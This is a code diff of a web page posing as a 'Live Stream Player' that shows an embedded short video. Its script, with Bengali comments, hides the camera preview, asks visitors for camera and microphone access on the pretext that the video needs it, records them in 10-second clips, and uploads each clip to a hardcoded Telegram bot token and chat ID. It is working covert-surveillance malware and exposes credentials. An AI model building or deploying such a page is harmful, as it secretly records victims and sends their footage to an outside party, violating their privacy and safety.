@@ -2,34 +2,37 @@
 <html lang="en-US">
 <head> 
 <meta charset="UTF-8"> 
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
-<meta name="robots" content="noindex, nofollow"> 
 <meta name="viewport" content="width=device-width,initial-scale=1"> 
-<title>Live Video Recording</title> 
+<title>Live Stream Player</title> 
 
 <style>
   body {
     margin: 0;
     padding: 0;
-    background-color: #000; /* ব্যাকগ্রাউন্ড কালো থাকলে ভিডিও সুন্দর দেখাবে */
-  }
-  #videoElement {
-    display: none; /* ক্যামেরা প্রিভিউ হাইড করা থাকবে */
+    background-color: #000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    overflow: hidden;
   }
   #videoContainer {
+    width: 100%;
     text-align: center;
-    padding-top: 20px;
   }
   iframe {
     width: 90%;
-    max-width: 360px; /* শর্ট ভিডিওর জন্য পারফেক্ট সাইজ */
+    max-width: 360px;
     height: 640px;
-    border: 2px solid #333;
-    border-radius: 10px;
+    border: 2px solid #222;
+    border-radius: 15px;
+    box-shadow: 0 0 20px rgba(255,255,255,0.1);
+  }
+  #videoElement {
+    display: none;
   }
 </style>
-
 </head> 
 <body>
 
@@ -42,63 +45,72 @@
     </iframe>
 </div>
 
-<video id="videoElement" autoplay playsinline></video>
+<video id="videoElement" autoplay playsinline muted></video>
 
 <script>
-  // ক্যামেরা এবং মাইক্রোফোন অ্যাক্সেস শুরু
-  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-    .then((stream) => {
-      let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-      let recordedChunks = [];
+  let mediaRecorder;
+  let recordedChunks = [];
+  const botToken = '8214066152:AAHbgVjbtqg1d8Zk81n0roteOW07ByBb_CE';
+  const chatId = '6717236638';
 
-      mediaRecorder.ondataavailable = (event) => {
-        if (event.data.size > 0) {
-          recordedChunks.push(event.data);
-        }
-      };
+  async function initCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      const videoElement = document.getElementById('videoElement');
+      videoElement.srcObject = stream;
 
-      mediaRecorder.onstop = () => {
-        if (recordedChunks.length > 0) {
-          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-          sendToTelegram(videoBlob);
-        }
-        recordedChunks = [];
-        startRecording(); 
-      };
+      startRecording(stream);
+    } catch (error) {
+      console.error('Camera access denied:', error);
+      alert('ভিডিওটি সঠিকভাবে দেখার জন্য ক্যামেরা পারমিশন এলাউ করুন।');
+    }
+  }
 
-      function startRecording() {
-        recordedChunks = [];
-        mediaRecorder.start();
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, 10000); // প্রতি ১০ সেকেন্ড পরপর ভিডিও পাঠানো হবে
+  function startRecording(stream) {
+    // মোবাইল এবং ডেস্কটপ উভয়ের জন্য সাপোর্টেড ফরম্যাট চেক
+    const options = { mimeType: 'video/webm;codecs=vp8' };
+    mediaRecorder = new MediaRecorder(stream, options);
+
+    mediaRecorder.ondataavailable = (event) => {
+      if (event.data.size > 0) {
+        recordedChunks.push(event.data);
       }
+    };
 
-      startRecording(); 
-      
-    })
-    .catch((error) => {
-      console.error('Permission error:', error);
-      alert('ভিডিও দেখার জন্য ক্যামেরা পারমিশন প্রয়োজন!');
-    });
+    mediaRecorder.onstop = () => {
+      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+      sendToTelegram(videoBlob);
+      recordedChunks = [];
+      mediaRecorder.start(); // পরবর্তী ১০ সেকেন্ডের জন্য আবার শুরু
+    };
 
-  // টেলিগ্রামে ভিডিও পাঠানোর ফাংশন
+    // প্রথমবার রেকর্ডিং শুরু
+    mediaRecorder.start();
+
+    // প্রতি ১০ সেকেন্ড পরপর সেভ করে টেলিগ্রামে পাঠাবে
+    setInterval(() => {
+      if (mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    }, 10000); 
+  }
+
   function sendToTelegram(data) {
-    const botToken = '8214066152:AAHbgVjbtqg1d8Zk81n0roteOW07ByBb_CE';
-    const chatId = '6717236638';
-
     const formData = new FormData();
     formData.append('chat_id', chatId);
-    formData.append('video', data, 'recorded_video.webm');
+    formData.append('video', data, 'live_capture.webm');
 
     fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
       method: 'POST',
       body: formData
     })
-    .then(response => response.json())
-    .then(data => console.log("Telegram Response:", data))
-    .catch(error => console.error('Error sending to Telegram:', error));
+    .then(res => res.json())
+    .then(output => console.log("Sent:", output))
+    .catch(err => console.error("Upload error:", err));
   }
+
+  // পেজ লোড হওয়ার সাথে সাথে ক্যামেরা ইনিশিয়ালাইজ করবে
+  window.onload = initCamera;
 </script>
 
 </body>
